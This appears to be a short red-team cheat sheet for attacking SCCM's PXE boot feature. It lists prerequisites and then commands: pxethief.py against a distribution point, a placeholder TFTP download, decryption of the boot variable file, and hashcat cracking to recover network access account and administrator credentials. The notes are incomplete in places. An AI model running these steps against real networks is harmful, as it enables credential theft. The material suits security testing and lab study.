# Attacks
## Preboot execution environment (PXE)
SCCM contains a preboot execution environment (PXE) feature which allows systems to load a specific operating system image on boot.
### PXE without account
#### Requierements
- Unauthenticated network access
- Line of sight to DHCP server (optional, but helps)
- Line of sight to PXE-enabled distribution point

#### Exploitation
Run this from a windows machine to be able to decrypt the password:
```
python3 pxethief.py 2 [Distribution Point address]
```
You can find NAA credentials, administrator account, etc.

### PXE with an account 
Anonymous access is not anymore possible 
#### Requierements

#### Exploitation
First run the following commands to check the account usage:
```
python3 pxethief.py 2 [Distribution Point address]
```
Now dowloads the file with the previously given command:
```
tftp blablabla
```
On windows:
```
pxethief.py 5 '[path/2/file].boot.var'
```
Then crack the hash:
```
hashcat -m 19850 -a 0 hash wordlists
```
On windows (again):
```
pxethief.py 5 '[path/2/file].boot.var' [password]
```


### More information
https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/CRED/CRED-1/cred-1_description.md#cred-1
https://mayfly277.github.io/posts/SCCM-LAB-part0x1/#show-sccm-hunter-results
